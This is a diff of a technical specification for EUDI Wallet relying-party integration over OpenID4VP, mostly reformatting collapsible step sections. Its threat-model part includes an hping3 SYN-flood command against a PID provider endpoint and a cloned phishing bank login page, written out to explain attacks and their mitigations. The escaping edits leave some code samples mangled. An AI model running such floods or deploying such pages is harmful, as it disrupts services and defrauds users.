 The RP redirects the User's browser to the intermediary's authorization endpoint using the `redirect_uri` from step 3 (same-device flow), or renders the intermediary-provided QR code for the User to scan with their Wallet (cross-device flow). This handoff is transparent to the User — the browser follows a standard HTTP 302 redirect. The RP may display a loading indicator with text like *"Connecting to identity verification service..."* during the redirect.
 
 > **Same-device vs. cross-device**: The choice depends on the User's device. If the User is on a mobile device with a Wallet installed, the same-device redirect (via custom scheme `openid4vp://` or Digital Credentials API) is preferred. If the User is on a desktop, the QR code cross-device flow is required.
 
 </details>
-<details><summary><strong>5. User Browser delivers authorization request to Wallet Unit</strong></summary>
+<details>
+<summary><strong>5. User Browser delivers authorization request to Wallet Unit</strong></summary>
 
 The User's Wallet receives the OpenID4VP authorization request — either via QR code scan (cross-device), custom scheme redirect (same-device), or Digital Credentials API invocation (same-device, Model D). The Wallet fetches the JAR from the `request_uri` and parses the signed JWT. The JAR is signed by the **intermediary's WRPAC** — the Wallet authenticates the intermediary as the Relying Party, then reads the `rp_info` extension to identify the end-RP. This two-layer identity is a unique aspect of the intermediary model (§25.2).
 
 > **Trust chain**: The Wallet verifies the intermediary's WRPAC chain against the LoTE (§5.5.3), just as it would for a direct RP. The Wallet then extracts the end-RP identity from the `rp_info` extension, which the intermediary populated using the `rp_id` from step 2.
 
 </details>
-<details><summary><strong>6. Wallet Unit displays consent screen showing both Intermediary and End-RP identities</strong></summary>
+<details>
+<summary><strong>6. Wallet Unit displays consent screen showing both Intermediary and End-RP identities</strong></summary>
 
 The Wallet displays a consent screen that identifies **both** the intermediary and the end-RP — a transparency requirement mandated by Art. 5b(10) and §25.3. The consent screen must clearly distinguish the two roles:
 
@@ -17750,14 +18247,16 @@ The User reviews the requested attributes (from the DCQL query) and sees which s
 > **If the User denies consent**: No data is transmitted. The intermediary session transitions to `Failed`, and the intermediary sends an error callback to the end-RP's `callbackUri` (if error callbacks are supported — see §26.6.7).
 
 </details>
-<details><summary><strong>7. Wallet Unit submits VP Token to Intermediary via `direct_post`</strong></summary>
+<details>
+<summary><strong>7. Wallet Unit submits VP Token to Intermediary via `direct_post`</strong></summary>
 
 The Wallet POSTs the `vp_token` (encrypted with the intermediary's ephemeral public key from the JAR) to the intermediary's `response_uri`. This is the **L1 (protocol-layer) callback** — it goes directly to the intermediary, not the end-RP. The intermediary decrypts the JWE and extracts the raw credential data. The end-RP **never sees the original VP Token** — it only receives the verified attributes forwarded by the intermediary in step 9.
 
 > **This is the architectural firewall**: The VP Token contains the raw SD-JWT or mdoc credential, including the issuer signature, KB-JWT, and potentially all disclosed attributes. By design, only the intermediary has access to this raw material — the end-RP receives a processed, intermediary-signed assertion. This separation is both a privacy benefit (the end-RP cannot see the credential's internal structure) and a trust trade-off (the end-RP must trust the intermediary's verification).
 
 </details>
-<details><summary><strong>8. Intermediary executes full verification pipeline (AS-RP-51-012)</strong></summary>
+<details>
+<summary><strong>8. Intermediary executes full verification pipeline (AS-RP-51-012)</strong></summary>
 
 The intermediary performs the five-dimension verification pipeline mandated by ARF HLR AS-RP-51-012: authenticity (issuer signature + LoTE chain), revocation (TokenStatusList), device binding (KB-JWT / DeviceAuth), user binding (WSCA-signed challenge), and Wallet Unit authenticity. The full specification of these verification gates — including the "As Agreed" qualification and conditional forwarding rules — is in §25.4.1.
 
@@ -17770,7 +18269,8 @@ If any **agreed** verification dimension fails, the intermediary `SHALL NOT` for
 **Audit Telemetry:** The Intermediary asserts an `INTERMEDIARY_ATTRIBUTE_FORWARDING_ABORTED` event in its unified audit logs.
 
 </details>
-<details><summary><strong>9. Intermediary forwards verified attributes to End-RP Backend via L2 callback</strong></summary>
+<details>
+<summary><strong>9. Intermediary forwards verified attributes to End-RP Backend via L2 callback</strong></summary>
 
 The intermediary POSTs a signed JWT to the end-RP's `callbackUri` (configured in step 2). The payload follows the L2 callback specification (§26.6.5):
 
@@ -17807,7 +18307,8 @@ After sending the callback, the intermediary **deletes the attribute values** (`
 **Artifact Produced:** Signed L2 JWT Assertion containing `verification_dimensions`, risk metrics, and decrypted attributes.
 
 </details>
-<details><summary><strong>10. End-RP Backend verifies intermediary JWT signature</strong></summary>
+<details>
+<summary><strong>10. End-RP Backend verifies intermediary JWT signature</strong></summary>
 
 The RP validates the intermediary's JWS signature using the intermediary's public key, which was obtained during the service onboarding process (typically via the intermediary's JWKS endpoint, e.g., `https://idnow.eu/.well-known/jwks.json`). This is the **end-RP's only cryptographic verification** — it trusts the intermediary to have correctly performed the full five-dimension verification in step 8. The RP also validates:
 
@@ -17822,7 +18323,8 @@ The RP validates the intermediary's JWS signature using the intermediary's publi
 **Audit Telemetry:** The End-RP Backend strictly logs an `INTERMEDIARY_ASSERTION_SIGNATURE_FAILED` incident.
 
 </details>
-<details><summary><strong>11. End-RP Backend processes attributes and applies business rules</strong></summary>
+<details>
+<summary><strong>11. End-RP Backend processes attributes and applies business rules</strong></summary>
 
 The RP extracts the `disclosed_attributes` from the verified intermediary JWT and feeds them into its business logic layer. The processing depends on the RP's use case:
 
@@ -17834,7 +18336,8 @@ The RP extracts the `disclosed_attributes` from the verified intermediary JWT an
 The RP treats the intermediary's signed assertion as the **authoritative source** — equivalent to what a direct RP would derive from its own cryptographic verification. The RP should store the `session_id`, `presentation_timestamp`, and `verification_dimensions` for audit trail purposes (§31.3), associating them with the customer's record.
 
 </details>
-<details><summary><strong>12. End-RP Backend redirects User Browser to authenticated page</strong></summary>
+<details>
+<summary><strong>12. End-RP Backend redirects User Browser to authenticated page</strong></summary>
 
 The RP completes the User's session by redirecting to the authenticated area of the application. The redirect mechanism depends on how the flow was initiated:
 
@@ -17900,7 +18403,8 @@ sequenceDiagram
     end
 ```
 
-<details><summary><strong>1. Wallet Unit submits VP Token to RP API Gateway via direct_post</strong></summary>
+<details>
+<summary><strong>1. Wallet Unit submits VP Token to RP API Gateway via direct_post</strong></summary>
 
 The Wallet sends the VP Token (encrypted as `direct_post.jwt`) to the `response_uri`, which the RP has configured to point at **its own API gateway** rather than directly at the verifier backend. This is the critical architectural decision: by owning the `response_uri` domain, the RP's gateway becomes the first recipient of the Wallet's HTTP request — giving it full access to the raw request and all associated HTTP context.
 
@@ -17921,7 +18425,8 @@ response=eyJhbGciOiJFQ0RILUVTI...[JWE]...&state=sess_7f3a9b2c
 ```
 
 </details>
-<details><summary><strong>2. RP API Gateway captures HTTP context and applies pre-verification policies</strong></summary>
+<details>
+<summary><strong>2. RP API Gateway captures HTTP context and applies pre-verification policies</strong></summary>
 
 Before forwarding anything to the verifier backend, the gateway captures the full HTTP context from the Wallet's request — information that is **unavailable** in asynchronous delivery modes (push/ping/poll) where the verifier, not the RP, receives the `direct_post`. This is the first of two gateway interception points where the RP can inject custom logic.
 
@@ -17944,7 +18449,8 @@ If any pre-verification policy triggers a rejection, the gateway returns an erro
 **Audit Telemetry:** The gateway logs an `HTTP_CONTEXT_CAPTURED` event. If a pre-verification policy rejects the request, the gateway logs a `PRE_VERIFICATION_REJECTED` event with the rejection reason (rate limit, geo-block, invalid state) and the request is terminated.
 
 </details>
-<details><summary><strong>3. RP API Gateway forwards VP Token to verifier backend</strong></summary>
+<details>
+<summary><strong>3. RP API Gateway forwards VP Token to verifier backend</strong></summary>
 
 After pre-verification policies pass, the gateway proxies the VP Token payload to the verifier backend over a **mutual TLS** (mTLS) connection. The gateway forwards the original `direct_post` body unchanged — the verifier receives the same JWE-encrypted VP Token the Wallet submitted.
 
@@ -17969,7 +18475,8 @@ response=eyJhbGciOiJFQ0RILUVTI...[JWE]...&state=sess_7f3a9b2c
 ```
 
 </details>
-<details><summary><strong>4. Verifier backend performs cryptographic verification</strong></summary>
+<details>
+<summary><strong>4. Verifier backend performs cryptographic verification</strong></summary>
 
 The verifier backend receives the proxied `direct_post` and executes the full OID4VP verification pipeline: JWE decryption (using the ephemeral private key generated during session creation), SD-JWT signature verification against the issuer's trust anchor (LoTE lookup — §5.5.3), selective disclosure validation, revocation check (Token Status List — draft-ietf-oauth-status-list), and holder binding verification (KB-JWT `nonce` + `aud` matching).
 
@@ -17980,7 +18487,8 @@ This step is identical to the standard verification flow documented in §18.5 �
 **Audit Telemetry:** The verifier logs standard verification events (`SIGNATURE_VALID`, `REVOCATION_CHECK_PASSED`, `HOLDER_BINDING_VERIFIED`).
 
 </details>
-<details><summary><strong>5. Verifier backend returns verification result to RP API Gateway</strong></summary>
+<details>
+<summary><strong>5. Verifier backend returns verification result to RP API Gateway</strong></summary>
 
 The verifier returns the verification result — disclosed attributes, per-credential pass/fail status, and verification metadata — in the HTTP response to the gateway's proxied request. Because this is a **synchronous** exchange (the gateway held the connection open), the result arrives within the same HTTP round-trip.
 
@@ -18011,7 +18519,8 @@ This is the critical difference from asynchronous delivery modes: in push/ping/p
 ```
 
 </details>
-<details><summary><strong>6. RP API Gateway dispatches inline enrichment request with combined context</strong></summary>
+<details>
+<summary><strong>6. RP API Gateway dispatches inline enrichment request with combined context</strong></summary>
 
 This is the second gateway interception point — and the one that delivers the most architectural value. The gateway now holds **both** the HTTP context (from step 2) and the verification result (from step 5). It combines them into a unified enrichment request and dispatches it to one or more inline enrichment services before the Wallet's HTTP connection times out (§10.3: typically 30 seconds).
 
@@ -18036,7 +18545,8 @@ This inline processing is **impossible** with asynchronous delivery modes — by
 **Audit Telemetry:** The gateway logs an `ENRICHMENT_DISPATCHED` event with the session correlator and the enrichment service target(s).
 
 </details>
-<details><summary><strong>7. Inline enrichment service(s) return result to RP API Gateway</strong></summary>
+<details>
+<summary><strong>7. Inline enrichment service(s) return result to RP API Gateway</strong></summary>
 
 The enrichment service(s) return their results. The gateway aggregates the responses and makes a **real-time decision**:
 - **Allow** (all checks pass, risk ≤ threshold) — proceed to step 8, return success to the Wallet
@@ -18064,7 +18574,8 @@ The decision logic may be as simple as a risk score threshold or as complex as a
 ```
 
 </details>
-<details><summary><strong>8. RP API Gateway returns HTTP response to Wallet Unit</strong></summary>
+<details>
+<summary><strong>8. RP API Gateway returns HTTP response to Wallet Unit</strong></summary>
 
 The gateway constructs the final HTTP response to the Wallet, completing the `direct_post` round-trip. The response follows the OID4VP specification: for same-device flows, it includes a `redirect_uri` pointing back to the RP's frontend; for cross-device flows, it returns a `response_code` that the RP's frontend polls for.
 
@@ -18181,7 +18692,7 @@ L2 webhook endpoints are attractive attack targets — an attacker who can forge
 
 | Mechanism | How it works | Strength |
 |:----------|:------------|:--------:|
-| **API key in `Authorization` header** | Verifier includes a pre-shared secret as `Bearer <key>` | Basic — protects against unauthenticated requests; vulnerable to key leakage |
+| **API key in `Authorization` header** | Verifier includes a pre-shared secret as `Bearer &lt;key>` | Basic — protects against unauthenticated requests; vulnerable to key leakage |
 | **HMAC signature** | Verifier signs the request body with a shared secret; RP validates `X-Signature` header | Strong — ensures payload integrity; replay-resistant with timestamp validation |
 | **Mutual TLS (mTLS)** | Both verifier and RP present client certificates | Strongest — cryptographic identity on both sides; eliminates key management |
 | **IP allowlisting** | RP restricts webhook endpoint to verifier's known IP ranges | Supplementary — layer on top of API key or HMAC; not sufficient alone |
@@ -18932,7 +19443,8 @@ sequenceDiagram
     end
 ```
 
-<details><summary><strong>1. Rogue RP attempts credential enumeration via DC-API</strong></summary>
+<details>
+<summary><strong>1. Rogue RP attempts credential enumeration via DC-API</strong></summary>
 
 A malicious Relying Party attempts to use the `navigator.credentials.get()` API as an enumeration scanner to silently profile what credentials (and therefore which Wallet apps) the user holds. Conversely, an untrusted host operating system might attempt to spy on the exact attributes the user presents.
 
@@ -18942,7 +19454,8 @@ A malicious Relying Party attempts to use the `navigator.credentials.get()` API 
 
 </details>
 
-<details><summary><strong>2. OS Credential Manager isolates evaluation in Wasm sandboxes</strong></summary>
+<details>
+<summary><strong>2. OS Credential Manager isolates evaluation in Wasm sandboxes</strong></summary>
 
 Both vectors are structurally mitigated by the W3C DC-API and platform Credential Manager architectures. The RP never receives an "inventory" of installed wallets or credentials; it only receives a success/fail response after explicit user consent.
 
@@ -18950,7 +19463,8 @@ Both vectors are structurally mitigated by the W3C DC-API and platform Credentia
 
 </details>
 
-<details><summary><strong>3. Wallet Unit Wasm matcher prevents OS inspection</strong></summary>
+<details>
+<summary><strong>3. Wallet Unit Wasm matcher prevents OS inspection</strong></summary>
 
 The OS layer does not evaluate the RP's `dcql_query` or inspect the user's credentials natively. Instead, the OS passes the request into a secure, Wallet-provided **WebAssembly (Wasm) Matcher** sandbox. The Wasm logic evaluates the match securely and returns only safe UI metadata back to the OS. The privacy boundary is absolute.
 
@@ -19028,7 +19542,8 @@ sequenceDiagram
     end
 ```
 
-<details><summary><strong>1. MITM Attacker intercepts presentation</strong></summary>
+<details>
+<summary><strong>1. MITM Attacker intercepts presentation</strong></summary>
 
 The MITM Attacker intercepts the Wallet's `POST /response_uri` payload containing the JWE-encrypted `vp_token` and `presentation_submission`. This typically requires compromising the TLS connection (e.g., via a rogue CA certificate installed on a corporately managed device, or premature TLS termination via a malicious public proxy).
 
@@ -19046,14 +19561,16 @@ vp_token=eyJhbGciOiJFQ0RILUVT...[encrypted blob]
 **Artifact Produced:** Intercepted JWE string payload capturing the exact `POST` request state.
 
 </details>
-<details><summary><strong>2. RP Server completes legitimate presentation</strong></summary>
+<details>
+<summary><strong>2. RP Server completes legitimate presentation</strong></summary>
 
 The original presentation from the Victim's Wallet reaches the RP and is processed successfully — the legitimate session is authenticated, and the RP marks the nonce as consumed in its session cache. The MITM Attacker, having intercepted a copy, now holds a duplicate of the entire JWE payload.
 
 **Artifact Produced:** Ephemeral server-side session state object with the `nonce_consumed: true` flag set.
 
 </details>
-<details><summary><strong>3. MITM Attacker replays payload to RP Server</strong></summary>
+<details>
+<summary><strong>3. MITM Attacker replays payload to RP Server</strong></summary>
 
 The MITM Attacker forwards the identical URL-encoded JWE payload to the Relying Party's `response_uri` endpoint, hoping to authenticate an attacker-controlled session or re-trigger a one-time operation (e.g., transaction authorization).
 
@@ -19070,7 +19587,8 @@ vp_token=eyJhbGciOiJFQ0RILUVT...[encrypted JWE blob]...
 **Artifact Produced:** Replayed URL-encoded `POST` payload attempting unauthorized state extraction.
 
 </details>
-<details><summary><strong>4. RP Server evaluates nonce uniqueness</strong></summary>
+<details>
+<summary><strong>4. RP Server evaluates nonce uniqueness</strong></summary>
 
 The RP Server successfully decrypts the JWE using its server-side ephemeral private key. It extracts the `nonce` claim structurally bound within the inner Key Binding JWT (`KB-JWT`, for SD-JWT VCs) or the `DeviceSignature` (for mdoc). Crucially, the RP queries its Redis/memory session cache to determine if the nonce is simultaneously active and unconsumed.
 
@@ -19089,7 +19607,8 @@ The RP Server successfully decrypts the JWE using its server-side ephemeral priv
 **Artifact Produced:** Extracted cryptographic `nonce` value isolated from the decrypted KB-JWT.
 
 </details>
-<details><summary><strong>5. RP Server rejects replayed presentation</strong></summary>
+<details>
+<summary><strong>5. RP Server rejects replayed presentation</strong></summary>
 
 The RP Server detects that the `nonce` inside the payload does not match the Attacker's active frontend session, or that the specific nonce has already been consumed by the legitimate Victim's successful presentation.
 
@@ -19163,9 +19682,10 @@ sequenceDiagram
     end
 ```
 
-<details><summary><strong>1. Attacker Infrastructure constructs malicious Authorization Request</strong></summary>
+<details>
+<summary><strong>1. Attacker Infrastructure constructs malicious Authorization Request</strong></summary>
 
-Having compromised the Relying Party's secure storage (e.g., database breach or HSM export vulnerability), the Attacker Infrastructure constructs a forged JSON authorization payload specifying custom `<dcql_query>` requirements and an attacker-controlled `response_uri`.
+Having compromised the Relying Party's secure storage (e.g., database breach or HSM export vulnerability), the Attacker Infrastructure constructs a forged JSON authorization payload specifying custom `&lt;dcql_query>` requirements and an attacker-controlled `response_uri`.
 
 ```json
 // Forged JAR payload — constructed using stolen WRPAC private key
@@ -19204,7 +19724,8 @@ Having compromised the Relying Party's secure storage (e.g., database breach or 
 **Artifact Produced:** Forged JSON authorization request payload with the attacker's `response_uri`.
 
 </details>
-<details><summary><strong>2. Attacker Infrastructure signs payload with stolen private key</strong></summary>
+<details>
+<summary><strong>2. Attacker Infrastructure signs payload with stolen private key</strong></summary>
 
 The payload is wrapped into a JSON Web Signature (JWS). The Attacker Infrastructure signs the MAC using the stolen asymmetric private key (e.g., ECDSA P-256) and embeds the legitimate RP's X.509 certificate chain (`x5c`) within the JOSE header.
 
@@ -19232,12 +19753,14 @@ The payload is wrapped into a JSON Web Signature (JWS). The Attacker Infrastruct
 **Artifact Produced:** Forged JWS (JAR) Authorisation Request wrapping the attacker payload under the legitimate RP `x5c` chain.
 
 </details>
-<details><summary><strong>3. Attacker Infrastructure delivers malicious JAR to Victim Wallet</strong></summary>
+<details>
+<summary><strong>3. Attacker Infrastructure delivers malicious JAR to Victim Wallet</strong></summary>
 
 The Attacker Infrastructure delivers this forged Authorization Request to an arbitrary victim's EUDI Wallet, either through a phishing site using a same-device redirect or via a cross-device QR code.
 
 </details>
-<details><summary><strong>4. Wallet Unit computes client_id binding</strong></summary>
+<details>
+<summary><strong>4. Wallet Unit computes client_id binding</strong></summary>
 
 The Wallet Unit extracts the leaf X.509 certificate from the attacker's `x5c` header. Following OpenID4VP mutual TLS paradigms (`x509_san_dns`), it computes the SHA-256 fingerprint over the DER-encoded leaf. It automatically verifies that this calculated thumbprint legitimately matches the requested `client_id` string, successfully binding the malicious request to the compromised RP's DNS name.
 
@@ -19255,7 +19778,8 @@ if (computedThumbprint === payload.client_id) {
 **Artifact Produced:** Cryptographic SHA-256 fingerprint matching the legitimate `client_id` binding.
 
 </details>
-<details><summary><strong>5. Wallet Unit validates certificate chain</strong></summary>
+<details>
+<summary><strong>5. Wallet Unit validates certificate chain</strong></summary>
 
 The Wallet Unit checks the certificate chain's validity against its local List of Trusted Entities (LoTE). Because the WRPAC is genuinely issued down from a trusted Access CA, all basic path checks (`NotBefore`, `NotAfter`, ECDSA signatures) pass.
 
@@ -19294,7 +19818,8 @@ The Wallet Unit checks the certificate chain's validity against its local List o
 **Artifact Produced:** Local OS trust evaluation engine boolean result (Success or Revoked failure).
 
 </details>
-<details><summary><strong>6. Wallet Unit returns victim's PID attributes</strong></summary>
+<details>
+<summary><strong>6. Wallet Unit returns victim's PID attributes</strong></summary>
 
 Tricked by the mathematically valid cryptography, the Wallet Unit's consent screen displays the legitimate RP's authenticated name. Upon user approval, the Wallet Unit encrypts the sensitive PID attributes and transmits them to the Attacker Infrastructure's sinkhole `response_uri`.
 
@@ -19403,7 +19928,8 @@ sequenceDiagram
     end
 ```
 
-<details><summary><strong>1. Attacker Browser initiates login session</strong></summary>
+<details>
+<summary><strong>1. Attacker Browser initiates login session</strong></summary>
 
 The Attacker Browser opens the RP Server's legitimate portal in their own desktop environment, triggering the generation of a fresh server-side login context initialized with an active polling mechanism tracking the unique `sessionId`.
 
@@ -19419,7 +19945,8 @@ HTTP/1.1 200 OK
 **Artifact Produced:** Initialized server-side HTTP session state tracking the pending `sessionId`.
 
 </details>
-<details><summary><strong>2. RP Server renders QR code</strong></summary>
+<details>
+<summary><strong>2. RP Server renders QR code</strong></summary>
 
 The RP Server generates a cross-device QR code encapsulating an `openid-vc://` or `haip://` scheme URL. Crucially, the encoded `request_uri` intrinsically binds to the Attacker's active `sessionId` and freshly generated `nonce`.
 
@@ -19451,12 +19978,14 @@ The RP Server generates a cross-device QR code encapsulating an `openid-vc://` o
 **Artifact Produced:** Encoded `openid-vc://` URI explicitly binding the cross-device `sessionId` state.
 
 </details>
-<details><summary><strong>3. Attacker Browser relays QR code across side-channel</strong></summary>
+<details>
+<summary><strong>3. Attacker Browser relays QR code across side-channel</strong></summary>
 
 Using OCR forwarding, screen-capture, or malicious proxy software, the Attacker Browser user immediately transports the graphical QR code to a remote Victim. They commonly use social engineering (e.g., "Scan this to unlock your courier package") to induce action.
 
 </details>
-<details><summary><strong>4. Victim Wallet scans relayed QR code</strong></summary>
+<details>
+<summary><strong>4. Victim Wallet scans relayed QR code</strong></summary>
 
 The Victim Wallet scans the QR code arrayed on their alternate device. The Wallet correctly pulls the Authorization Request via the `request_uri`.
 
@@ -19470,7 +19999,8 @@ The Wallet cryptographically validates the RP's WRPAC, showing a valid, un-spoof
 **Artifact Produced:** Wallet-parsed `request_uri` extraction and corresponding verified WRPAC visual extraction.
 
 </details>
-<details><summary><strong>5. RP Server returns signed JAR Authorisation Request</strong></summary>
+<details>
+<summary><strong>5. RP Server returns signed JAR Authorisation Request</strong></summary>
 
 The RP responds to the Wallet's `GET /request_uri` with a signed JAR containing the presentation parameters (requested attributes, nonce, response_uri). The JAR signature validates against the RP's legitimate WRPAC — from the Victim Wallet's perspective, this is an authentic request from a registered RP.
 
@@ -19507,12 +20037,14 @@ The RP responds to the Wallet's `GET /request_uri` with a signed JAR containing 
 **Artifact Produced:** Signed JAR with legitimate RP cryptographic binding but attacker-initiated session context.
 
 </details>
-<details><summary><strong>6. Victim Wallet User approves seemingly legitimate RP</strong></summary>
+<details>
+<summary><strong>6. Victim Wallet User approves seemingly legitimate RP</strong></summary>
 
 The Victim Wallet User reviews the consent screen displaying the RP's verified identity (from WRPAC) and the requested attributes. Because the request originates from the legitimate RP infrastructure — not a spoofed endpoint — the Wallet's trust indicators are all green. The Victim User approves the presentation, unaware that the session belongs to the Attacker.
 
 </details>
-<details><summary><strong>7. Victim Wallet deposits Encrypted Response</strong></summary>
+<details>
+<summary><strong>7. Victim Wallet deposits Encrypted Response</strong></summary>
 
 Upon the remote Victim's consent, their Victim Wallet computes the Key Binding JWT over the Attacker's original `nonce` and submits the encrypted payload directly to the RP's legitimate `response_uri`, originating from the Victim's own IP address.
 
@@ -19544,7 +20076,8 @@ Upon the remote Victim's consent, their Victim Wallet computes the Key Binding J
 **Artifact Produced:** Cryptographic Key Binding JWT internally computed over the Attacker's relayed `nonce`.
 
 </details>
-<details><summary><strong>8. RP Server binds Victim identity</strong></summary>
+<details>
+<summary><strong>8. RP Server binds Victim identity</strong></summary>
 
 The RP Server validates the JWE, processing the internal `nonce` and algorithmically linking it back to the Attacker's designated `sessionId=xyz123`. The system subsequently binds the Victim's extracted PID attributes to that HTTP state.
 
@@ -19582,7 +20115,8 @@ The RP Server validates the JWE, processing the internal `nonce` and algorithmic
 **Artifact Produced:** In-memory transition functionally binding decrypted PID claim data to the active Attacker session.
 
 </details>
-<details><summary><strong>9. RP Server grants authenticated session</strong></summary>
+<details>
+<summary><strong>9. RP Server grants authenticated session</strong></summary>
 
 The Attacker's active desktop browser receives the signal that the presentation was successful, silently bridging the Attacker into a fully authenticated session hijacked under the Victim's name.
 
@@ -19657,7 +20191,8 @@ sequenceDiagram
     end
 ```
 
-<details><summary><strong>1. Fake RP registers under look-alike domain</strong></summary>
+<details>
+<summary><strong>1. Fake RP registers under look-alike domain</strong></summary>
 
 The Fake RP successfully registers as a legal Relying Party entity (often utilizing shell companies) through a national Registrar. They obtain a cryptographically valid WRPAC containing a Subject Alternative Name (SAN) domain closely resembling the target.
 
@@ -19673,42 +20208,44 @@ Certificate:
 **Artifact Produced:** Registered SAN domains configured within the Attacker's X.509 CSR parameter.
 
 </details>
-<details><summary><strong>2. Registrar grants genuine WRPAC to Fake RP</strong></summary>
+<details>
+<summary><strong>2. Registrar grants genuine WRPAC to Fake RP</strong></summary>
 
 The national Registrar, having no mechanism to detect malicious intent from a legally registered entity, issues a cryptographically genuine WRPAC to the Fake RP. This certificate is indistinguishable from any legitimate RP's WRPAC — it chains to the same Access CA root of trust and passes all standard X.509 validation checks.
 
 **Artifact Produced:** Cryptographically genuine WRPAC credential signed by an authoritative EU Access CA.
 
 </details>
-<details><summary><strong>3. Fake RP lures Victim to phishing page</strong></summary>
+<details>
+<summary><strong>3. Fake RP lures Victim to phishing page</strong></summary>
 
 The Victim is directed to the Fake RP's website, which visually mirrors the legitimate RP's frontend. The Fake RP initiates a genuine OpenID4VP authorization request.
 
 ```html
-<!-- Phishing page — pixel-perfect clone of legitimate bank login -->
-<!-- Hosted at https://fakc-bank.example (homoglyph of "fake") -->
-<!DOCTYPE html>
-<html lang="de">
-<head>
-  <title>Bank Login – Sichere Anmeldung mit EUDI Wallet</title>
-  <link rel="icon" href="/assets/stolen-favicon.ico">
-  <meta name="description" content="Login with your EUDI Wallet">
-</head>
-<body>
-  <!-- Cloned header with legitimate bank's logo and styling -->
+&lt;!-- Phishing page — pixel-perfect clone of legitimate bank login -->
+&lt;!-- Hosted at https://fakc-bank.example (homoglyph of "fake") -->
+&lt;!DOCTYPE html>
+&lt;html lang="de">
+&lt;head>
+  &lt;title>Bank Login – Sichere Anmeldung mit EUDI Wallet&lt;/title>
+  &lt;link rel="icon" href="/assets/stolen-favicon.ico">
+  &lt;meta name="description" content="Login with your EUDI Wallet">
+&lt;/head>
+&lt;body>
+  &lt;!-- Cloned header with legitimate bank's logo and styling -->
   <div class="login-modal">
     <img src="/assets/bank-logo-cloned.svg" alt="Bank Logo">
     <h1>Anmelden mit EUDI Wallet</h1>
     <p>Scannen Sie den QR-Code mit Ihrer Wallet-App</p>
 
-    <!-- QR code encodes the attacker's legitimate OpenID4VP URI -->
+    &lt;!-- QR code encodes the attacker's legitimate OpenID4VP URI -->
     <div id="qr-code" data-uri="openid4vp://authorize?
       client_id=fakc-bank.example&
       request_uri=https://fakc-bank.example/api/jar/sess_atk_001">
     </div>
 
-    <!-- JavaScript polls attacker's server for VP submission -->
-    <script>
+    &lt;!-- JavaScript polls attacker's server for VP submission -->
+    &lt;script>
       const pollInterval = setInterval(async () => {
         const res = await fetch('/api/session/poll?id=sess_atk_001');
         if (res.ok) {
@@ -19717,11 +20254,11 @@ The Victim is directed to the Fake RP's website, which visually mirrors the legi
           window.location = '/dashboard?authenticated=true';
         }
       }, 2000);
-    </script>
+    &lt;/script>
   </div>
-</body>
-</html>
-<!-- ⚠️ The QR code points to the attacker's own valid JAR endpoint.
+&lt;/body>
+&lt;/html>
+&lt;!-- ⚠️ The QR code points to the attacker's own valid JAR endpoint.
   The WRPAC behind it is genuine (issued by a real Access CA), so the
   Wallet will validate it successfully. The only visible difference:
   "fakc-bank.example" vs. "fake-bank.example" in the consent screen. -->
@@ -19730,12 +20267,14 @@ The Victim is directed to the Fake RP's website, which visually mirrors the legi
 **Artifact Produced:** Pixel-perfect phishing page with cross-device QR code initiating a valid OpenID4VP flow.
 
 </details>
-<details><summary><strong>4. Victim Wallet scans and initializes presentation</strong></summary>
+<details>
+<summary><strong>4. Victim Wallet scans and initializes presentation</strong></summary>
 
 The Victim Wallet consumes the Fake RP's request. Because the WRPAC is issued by a genuine Access CA, the Wallet's cryptographic validation passes completely.
 
 </details>
-<details><summary><strong>5. Victim Wallet validates Fake RP's WRPAC successfully</strong></summary>
+<details>
+<summary><strong>5. Victim Wallet validates Fake RP's WRPAC successfully</strong></summary>
 
 The Victim Wallet's internal trust evaluation engine validates the Fake RP's WRPAC certificate chain against the Trusted List anchors. Because the certificate is genuinely issued by a legitimate Access CA, all cryptographic checks pass — signature verification succeeds, the certificate is not revoked, and the SAN matches the requesting domain. The Wallet displays a green trust indicator to the Victim.
 
@@ -19773,7 +20312,7 @@ async function evaluateWRPAC(jarHeader, callingOrigin, flowType) {
   // No programmatic check exists — user must visually verify
   // "fakc-bank.example" vs "fake-bank.example" on consent screen.
 
-  return { trusted: true, display: `${leafCert.subject.O} (${sanDomain})` };
+  return { trusted: true, display: `$\{leafCert.subject.O\} (${sanDomain})` };
   // Consent screen shows: "Fakc Bank AG (fakc-bank.example)" ✅
   // User must notice "fakc" ≠ "fake" — a difficult visual distinction
 }
@@ -19782,7 +20321,8 @@ async function evaluateWRPAC(jarHeader, callingOrigin, flowType) {
 **Artifact Produced:** Successful Wallet OS cryptographic trust evaluation Boolean logic confirming mathematical validity.
 
 </details>
-<details><summary><strong>6. Victim Wallet returns PID Attributes to Fake RP</strong></summary>
+<details>
+<summary><strong>6. Victim Wallet returns PID Attributes to Fake RP</strong></summary>
 
 If the Victim fails to carefully inspect the domain/organization name on the Wallet's consent screen, they approve the release of their encrypted identity attributes directly to the Fake RP's endpoints.
 
@@ -19859,7 +20399,8 @@ sequenceDiagram
     end
 ```
 
-<details><summary><strong>1. Botnet Attacker launches Volumetric DDoS Attack</strong></summary>
+<details>
+<summary><strong>1. Botnet Attacker launches Volumetric DDoS Attack</strong></summary>
 
 The Botnet Attacker orchestrates a high-volume botnet TCP flood assault (or BGP hijack) against the national PID Provider's `status-list` endpoint. The sheer volume of synthetic traffic totally exhausts the endpoint's socket availability, rendering it unreachable to legitimate RP verification pipelines.
 
@@ -19871,7 +20412,8 @@ hping3 -c 1000000 -d 120 -S -w 64 -p 443 --flood pid-provider.example.eu
 **Artifact Produced:** Saturated host-level TCP/IP proxy pool demonstrating immediate connection rejection metrics.
 
 </details>
-<details><summary><strong>2. Wallet presents valid PID</strong></summary>
+<details>
+<summary><strong>2. Wallet presents valid PID</strong></summary>
 
 An independent user (or the attacker testing a revoked credential) attempts to authenticate at the RP Server by submitting a standard `vp_token`.
 
@@ -19912,7 +20454,8 @@ vp_token=eyJhbGciOiJFUzI1NiJ9.eyJpc3MiOiJodHRwczovL3BpZC1wcm92aW
 **Artifact Produced:** Standard `vp_token` submission with embedded Status List reference requiring online revocation resolution.
 
 </details>
-<details><summary><strong>3. RP Server attempts Revocation Check</strong></summary>
+<details>
+<summary><strong>3. RP Server attempts Revocation Check</strong></summary>
 
 The RP Server attempts to perform step 3 of the verification pipeline: verifying the attestation's revocation status by fetching the Status List URL.
 
@@ -19924,7 +20467,8 @@ Host: pid-provider.example.eu
 **Artifact Produced:** HTTP `GET` attempt capturing outbound revocation parameters bound for the Trust Infrastructure.
 
 </details>
-<details><summary><strong>4. PID Status List Endpoint fails to respond</strong></summary>
+<details>
+<summary><strong>4. PID Status List Endpoint fails to respond</strong></summary>
 
